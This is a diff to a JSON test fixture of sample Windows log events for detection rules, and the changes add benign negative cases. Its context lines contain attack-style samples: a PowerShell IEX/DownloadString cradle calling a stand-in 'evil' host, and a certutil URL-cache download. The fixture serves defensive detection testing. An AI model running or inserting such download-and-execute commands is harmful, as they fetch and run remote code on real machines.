@@ -77,6 +77,10 @@
       {
         "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
         "CommandLine": "pwsh -Command Get-Process"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -Command Out-File -Encoding utf8 report.txt"
       }
     ]
   },
@@ -253,6 +257,10 @@
       {
         "Image": "C:\\Windows\\System32\\certutil.exe",
         "CommandLine": "certutil -urlcache /transfer http://x/y"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -hashfile C:\\reports\\decode_summary.txt SHA256"
       }
     ]
   },
@@ -425,11 +433,20 @@
   },
   "system_win_service_installed.yml": {
     "true_positive": {
-      "EventID": 7045
+      "EventID": 7045,
+      "ImagePath": "C:\\Users\\Public\\svc.exe"
     },
     "true_negatives": [
       {
         "EventID": 7040
+      },
+      {
+        "EventID": 7045,
+        "ImagePath": "C:\\Program Files\\Vendor\\Agent\\agent.exe"
+      },
+      {
+        "EventID": 7045,
+        "ImagePath": "\"C:\\Program Files\\Vendor\\Agent\\agent.exe\""
       }
     ]
   },
@@ -533,6 +550,18 @@
       {
         "EventID": 4103,
         "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
+      },
+      {
+        "EventID": 4104,
+        "ScriptBlockText": "$port = [Convert]::ToInt32($configValue)"
+      },
+      {
+        "EventID": 4104,
+        "ScriptBlockText": "New-Object Net.WebClient"
+      },
+      {
+        "EventID": 4104,
+        "ScriptBlockText": "Invoke-WebRequest -Uri http://internal/report.csv -OutFile report.csv"
       }
     ]
   },
